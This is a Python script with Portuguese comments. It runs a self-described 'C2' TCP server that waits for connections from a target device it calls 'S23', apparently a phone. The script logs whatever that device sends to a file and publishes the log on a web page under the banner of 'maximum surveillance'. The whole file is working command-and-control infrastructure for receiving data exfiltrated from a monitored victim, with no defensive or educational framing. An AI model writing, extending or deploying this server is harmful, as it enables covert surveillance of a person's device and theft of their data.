import socket
import threading
import os
from http.server import HTTPServer, SimpleHTTPRequestHandler

# Configurações
HOST = "0.0.0.0"
C2_PORT = 8888
WEB_PORT = 8080
LOG_FILE = "target_logs.txt"

# Garante que o arquivo de log exista
if not os.path.exists(LOG_FILE):
    open(LOG_FILE, 'w').close()

def handle_client(conn, addr):
    print(f"[+] Conexão estabelecida com alvo: {addr}")
    try:
        while True:
            data = conn.recv(4096)
            if not data:
                break
            
            try:
                # Tenta decodificar como UTF-8, ignora erros para evitar travamento
                decoded_data = data.decode('utf-8', errors='ignore')
            except Exception:
                decoded_data = data.decode('latin-1', errors='ignore')

            # Salva em arquivo persistente
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"[ALVO: {addr}] {decoded_data}\n")
            
            # Exibe em tempo real no terminal
            print(f"\n--- DADOS DO S23 ({addr}) ---")
            print(decoded_data)
            print("-" * 30)
    except Exception as e:
        print(f"[-] Erro na conexão com {addr}: {e}")
    finally:
        conn.close()
        print(f"[-] Conexão encerrada com {addr}")

class LogHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # Redireciona raiz para /logs
        if self.path == '/':
            self.path = '/logs'
        
        if self.path == '/logs':
            try:
                with open(LOG_FILE, 'r', encoding="utf-8") as f:
                    content = f.read()
                
                self.send_response(200)
                self.send_header('Content-type', 'text/plain; charset=utf-8')
                self.end_headers()
                # CORREÇÃO AQUI: b"..." é obrigatório para streams binários
                self.wfile.write(content.encode('utf-8'))
            except FileNotFoundError:
                self.send_response(404)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(b"Arquivo de logs nao encontrado.")
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"404 Not Found")

    def log_message(self, format, *args):
        pass # Silencia logs HTTP

def start_web_server():
    server_address = ('', WEB_PORT)
    httpd = HTTPServer(server_address, LogHandler)
    print(f"[*] Servidor Web iniciado em http://{HOST}:{WEB_PORT}")
    try:
        ip = os.popen('hostname -I').read().split()[0]
        print(f"[*] Acesse no navegador: http://{ip}:{WEB_PORT}/logs")
    except:
        print(f"[*] Acesse no navegador: http://localhost:{WEB_PORT}/logs")
    httpd.serve_forever()

def start_c2_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, C2_PORT))
    server.listen(5)
    print(f"[*] Servidor C2 (TCP) ativo na porta {C2_PORT}. Aguardando conexão do S23...")
    
    while True:
        conn, addr = server.accept()
        t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        t.start()

if __name__ == "__main__":
    print(f"[*] Iniciando ambiente de vigilância máxima...")
    web_thread = threading.Thread(target=start_web_server, daemon=True)
    web_thread.start()
    start_c2_server()
